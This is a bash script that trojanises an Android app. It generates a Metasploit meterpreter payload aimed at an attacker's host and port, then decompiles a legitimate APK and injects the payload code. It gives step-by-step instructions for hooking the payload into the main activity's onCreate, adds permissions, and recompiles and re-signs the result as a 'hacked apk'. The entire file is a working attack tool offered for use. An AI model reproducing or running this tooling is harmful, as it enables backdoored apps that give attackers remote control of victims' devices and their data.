#!/bin/bash

declare -ir BOOL=(0 1)
readonly FALSE=${BOOL[0]}
readonly TRUE=${BOOL[1]}

# Colors
readonly BLACK='\033[0;30m'
readonly RED='\033[0;31m'
readonly GREEN='\033[0;32m'
readonly ORANGE='\033[0;33m'
readonly BLUE='\033[0;34m'
readonly PURPLE='\033[0;35m'
readonly CYAN='\033[0;36m'
readonly LGRAY='\033[0;37m'
readonly DGRAY='\033[1;30m'
readonly LRED='\033[1;31m'
readonly LGREEN='\033[1;32m'
readonly YELLOW='\033[1;33m'
readonly LBLUE='\033[1;34m'
readonly LPURPLE='\033[1;35m'
readonly LCYAN='\033[1;36m'
readonly WHITE='\033[1;37m'
readonly NC='\033[0m'

readonly TEMP_FOLDER='/tmp/payloadInserter'
readonly PAYLOAD_FOLDER=$TEMP_FOLDER'/payload'
readonly ORIGINAL_FOLDER=$TEMP_FOLDER'/original'
readonly dependencies=(lib32stdc++6 lib32ncurses5 lib32z1 msfvenom apktool jarsigner)
readonly original_apk=$1
readonly payload_apk=$TEMP_FOLDER'/payload.apk'
readonly payload_type=$2
readonly LHOST=$3
readonly LPORT=$4

check_dependencies() {
    result=$TRUE
    for package in $dependencies
    do
        if [ $(dpkg-query -W -f='${Status}' $package 2>/dev/null | grep -c "install ok installed") -eq 0 ]; then
            result=$FALSE;
        fi
    done

    if [[ ${result} -eq $TRUE ]]; then
        echo -e "${GREEN}OK${NC}"
    else
        echo -e "${RED}ERROR${NC}"
        echo -e "${RED}ERROR:${NC} Dependencies not installed. Run ${LCYAN}apt-get install lib32stdc++6 lib32ncurses5 lib32z1${NC}"
        exit -1;
    fi
    
    unset result
    unset OUT
}

generate_payload() {
    result=$(msfvenom -p android/meterpreter/$payload_type LHOST=$LHOST LPORT=$LPORT -o $payload_apk 2>&1)
    OUT=$?
    
    if [ $OUT -eq 0 ];then
        echo -e "${GREEN}OK${NC}"
    else
        echo -e "${RED}ERROR${NC}"
        echo -e "${LCYAN}Original output:${NC} \n$result"
        exit -1;
    fi
    
    unset result
    unset OUT
}

decompile_apk() {
    result=$(apktool d -f -o $1 $2 2>&1)
    OUT=$?
    
    if [ $OUT -eq 0 ];then
        echo -e "${GREEN}OK${NC}"
    else
        echo -e "${RED}ERROR${NC}"
        echo -e "${LCYAN}Original output:${NC} \n$result"
        exit -1;
    fi
    
    unset result
    unset OUT
}

copy_payload_files() {
    result=$(cp -R $PAYLOAD_FOLDER/smali $ORIGINAL_FOLDER/ 2>&1)
    OUT=$?
    
    if [ $OUT -eq 0 ];then
        echo -e "${GREEN}OK${NC}"
    else
        echo -e "${RED}ERROR${NC}"
        echo -e "${LCYAN}Original output:${NC} \n$result"
        exit -1;
    fi
    
    unset result
    unset OUT
}

hook_injection() {
    main_action_line=$(awk '/<action android:name="android.intent.action.MAIN"\/>/{ print NR; exit }' $ORIGINAL_FOLDER/AndroidManifest.xml)
    
    if [[ "$main_action_line" -gt "0" ]]; then
        for (( line=$main_action_line; line>0; line-- ))
        do
            result=$(sed "${line}q;d" $ORIGINAL_FOLDER/AndroidManifest.xml | grep "activity" 2>&1)
            (( $? == 0 )) && break
        done
        echo -e "${GREEN}OK${NC}"
        echo
        echo -e "Now, you should add the hook manually. To do this: "
        echo
        echo -e "1. Find the file smali in ${LCYAN}$ORIGINAL_FOLDER/smali${NC} that corresponds to the following activity:"
        echo -e "${ORANGE}$result${NC}"
        echo
        echo -e "2. Search for the following line:"
        echo -e "${ORANGE};->onCreate(Landroid/os/Bundle;)V${NC}"
        echo
        echo -e "3. Paste the following code in the line next to it:"
        echo -e "${ORANGE}invoke-static {p0}, Lcom/metasploit/stage/Payload;->start(Landroid/content/Context;)V${NC}"
        echo
        echo -e "${CYAN}When you are done, press any key to continue...${NC}" 
        read -n1 -r -p ""
    else
        echo -e "${RED}ERROR${NC}"
        echo -e "${LCYAN}Couldn't found 'android.intent.action.MAIN' in Android manifest${NC}\n"
        exit -1;
    fi
    
    unset main_action_line
    unset result
    unset line
}

permissions_injection() {
    readarray permissions < permissions.list
    missingPermissions=()
    for permission in "${permissions[@]}"
    do
        result=$(cat $ORIGINAL_FOLDER/AndroidManifest.xml | grep $permission)
        (( $? )) && missingPermissions+=($permission)
    done    
    echo -e "${GREEN}OK${NC}"
    echo
    echo -e "Now, you should add the permissions manually. To do this: "
    echo
    echo -e "1. Open ${LCYAN}$ORIGINAL_FOLDER/AndroidManifest.xml${NC}"
    echo
    echo -e "2. Add the permissions you want. Here's a list of the ones missing from this app:"
    echo
    for missingPermission in "${missingPermissions[@]}"
    do
        echo "<uses-permission android:name=\"android.permission.${missingPermission}\"/>"
    done
    echo
    echo -e "${CYAN}When you are done, press any key to continue...${NC}" 
    read -n1 -r -p ""
    
    unset permissions
    unset permission
    unset missingPermissions
    unset missingPermission
}

compile_apk() {
    result=$(apktool b $1 2>&1)
    OUT=$?
    
    if [ $OUT -eq 0 ];then
        echo -e "${GREEN}OK${NC}"
    else
        echo -e "${RED}ERROR${NC}"
        echo -e "${LCYAN}Original output:${NC} \n$result"
        exit -1;
    fi
    
    unset result
    unset OUT
}

sign_apk() {
    result=$(jarsigner -verbose -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA $1 androiddebugkey 2>&1)
    OUT=$?
    
    if [ $OUT -eq 0 ];then
        echo -e "${GREEN}OK${NC}"
    else
        echo -e "${RED}ERROR${NC}"
        echo -e "${LCYAN}Original output:${NC} \n$result"
        exit -1;
    fi
    
    unset result
    unset OUT
}

# Create temp folder
[ -d $TEMP_FOLDER ] || mkdir $TEMP_FOLDER

echo -e -n "${YELLOW}1. Checking dependencies .......${NC} "
check_dependencies

echo -e -n "${YELLOW}2. Generating payload apk ......${NC} "
generate_payload

echo -e -n "${YELLOW}3. Decompiling payload apk .....${NC} "
decompile_apk $PAYLOAD_FOLDER $payload_apk

echo -e -n "${YELLOW}4. Decompiling original apk ....${NC} "
decompile_apk $ORIGINAL_FOLDER $original_apk

echo -e -n "${YELLOW}5. Copying payload files .......${NC} "
copy_payload_files

echo -e -n "${YELLOW}6. Injecting the hook ..........${NC} "
hook_injection

echo -e -n "${YELLOW}7. Injecting permissions .......${NC} "
permissions_injection

echo -e -n "${YELLOW}8. Compiling the apk ...........${NC} "
compile_apk $ORIGINAL_FOLDER

echo -e -n "${YELLOW}9. Signing the apk .............${NC} "
sign_apk $ORIGINAL_FOLDER/dist/*

echo -e "${LCYAN}Done.${NC} You will find your hacked apk at ${LCYAN}$ORIGINAL_FOLDER/dist"${NC}

